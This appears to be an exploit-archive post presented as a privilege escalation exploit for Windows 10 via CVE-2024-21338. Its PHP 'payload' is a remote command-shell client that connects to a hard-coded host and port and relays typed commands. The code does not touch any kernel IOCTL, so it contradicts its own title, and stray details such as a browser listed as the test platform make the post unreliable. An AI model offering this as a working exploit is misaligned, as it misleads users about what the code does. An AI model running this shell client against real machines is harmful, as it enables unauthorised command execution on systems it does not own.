=============================================================================================================================================
| # Title     : Microsoft Windows version 10.0.19045.5487 kernel IOCTL privilege escalation exploit                                         |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
| # Vendor    : https://www.microsoft.com                                                                                                   |
=============================================================================================================================================

POC :

[+] Dorking İn Google Or Other Search Enggine.

[+] Code Description: Microsoft Windows version 10.0.19045.5487 kernel IOCTL privilege escalation exploit.

    (Related : https://packetstorm.news/files/id/177869/ Related CVE numbers:  CVE-2024-21338 ) .

[+] save code as poc.php.

[+] Usage : php poc.php 

[+] PayLoad :

<?php

class CVE_2024_21338_Exploit {
    private $rhost;
    private $rport;

    public function __construct($rhost, $rport) {
        $this->rhost = $rhost;
        $this->rport = $rport;
    }

    private function connect() {
        $sock = fsockopen($this->rhost, $this->rport, $errno, $errstr, 10);
        if (!$sock) {
            die("[-] فشل الاتصال بالسيرفر: $errstr ($errno)\n");
        }
        return $sock;
    }

    private function sendCommand($sock, $command) {
        fwrite($sock, $command . "\n"); // إرسال الأمر مع سطر جديد
        stream_set_timeout($sock, 5); // تحديد مهلة القراءة
        $response = '';

        while (!feof($sock)) {
            $data = fread($sock, 1024);
            if ($data === false || strlen($data) == 0) {
                break;
            }
            $response .= $data;

            if (strpos($response, "EOF") !== false) { // غيّر "EOF" حسب الاستجابة الفعلية
                break;
            }
        }

        return $response;
    }

    public function exploit() {
        $sock = $this->connect();

        echo "[+] الاتصال ناجح. يمكنك الآن تنفيذ الأوامر!\n";

        while (true) {
            echo "cmd> ";
            $command = trim(fgets(STDIN));

            if (strtolower($command) === "exit") {
                echo "[-] إنهاء الاتصال...\n";
                break;
            }

            $response = $this->sendCommand($sock, $command);
            echo $response . "\n";
        }

        fclose($sock);
    }
}

// تشغيل الاستغلال
$exploit = new CVE_2024_21338_Exploit("192.168.1.3", 4444);
$exploit->exploit();

?>

Greetings to :=====================================================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
===================================================================================================